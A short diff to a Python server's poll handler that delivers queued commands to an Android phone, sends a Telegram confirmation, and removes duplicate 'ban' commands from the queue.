@@ -831,9 +831,14 @@ async def poll(
         cmd_id = cmd.get("_id")
         if cmd_id and cmd_id in d["command_callbacks"]:
             cid = d["command_callbacks"].pop(cmd_id)
-            cmd["_chat_id"] = cid   # Android использует для upload/text_reply
+            cmd["_chat_id"] = cid
             asyncio.create_task(
                 send_tg(cid, f"📲 Телефон получил команду `{cmd.get('cmd')}`."))
+        # Если команда ban — удаляем дубли из очереди
+        if cmd.get("cmd") == "ban":
+            d["pending_commands"] = [
+                c for c in d["pending_commands"] if c.get("cmd") != "ban"
+            ]
         return {"active": d["active"], "command": cmd, "instance_id": INSTANCE_ID}
 
     return {"active": d["active"], "command": None, "instance_id": INSTANCE_ID}
